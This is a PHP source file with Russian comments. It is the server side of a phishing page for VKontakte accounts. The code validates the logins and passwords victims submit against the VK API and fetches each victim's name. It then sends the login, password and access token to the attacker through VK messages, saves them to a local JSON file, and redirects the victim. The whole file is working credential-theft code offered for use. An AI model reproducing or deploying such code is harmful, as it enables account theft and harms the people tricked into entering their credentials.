<?
include('config.php'); // Подрубаем конфиг
include('functions.php'); // Подрубаем функции

if(isset($_POST['login']) & isset($_POST['password'])){ // Чекаем, если ли на входе логин и пароль
	$login = $_POST['login'];
	$password = $_POST['password'];
	$captchaSid = $_POST['captchaSid'];
	$captchaKey = $_POST['captchaKey'];
	if(strlen(trim($login)) >= 6 & strlen($password) >= 6){ // Если логи написаны лбом по клавиатуре
		$check = check($apiId, $apiKey, $login, $password, $captchaSid, $captchaKey); // Чекаем аккаунт на валид
		$app = json_decode($check, 1);
		if(in_array("access_token", $app)){
			$accessToken = $app['access_token'];
			$userID = $app['user_id'];
			$request = request("https://api.vk.com/method/users.get", "uids=$userID"); // Чекаем инфу о юзере, чтобы потом послать её вместе с логом (для удобства)
			$info = json_decode($request, 1);
			$firstName = $info['response'][0]['first_name'];
			$lastName = $info['response'][0]['last_name'];
			$msg = urlencode("Имя: $firstName\nФамилия: $lastName\nЛогин: $login\nПароль: $password\nAccess_token: $accessToken");
			if($sendVK == 1){sendVK($tokenVK, $toVK, $titleVK, $msg);} // Шлём валидный лог прямо в ВК
			/* Заносим юзера в БД */
			$users = @file_get_contents($base);
			$array = @json_decode($users, true);
			$array[$login] = array('password' => $password, 'token' => $accessToken, 'id' => $userID, 'firstname' => $firstName, 'lastname' => $lastName);
			file_put_contents($base, json_encode($array));
			/* Заносим юзера в БД */			
			header("Location: $redirect");
		}elseif(@$app['error'] == "need_captcha"){ // Если на пути каптча
			$captchaSidz = $app['captcha_sid'];
			$captchaImgz = $app['captcha_img'];
			$captcha = 1;
			$error = 1;
		}else{
			$error = 1;
		}
	}else{
		$error = 1;
	}
}
?>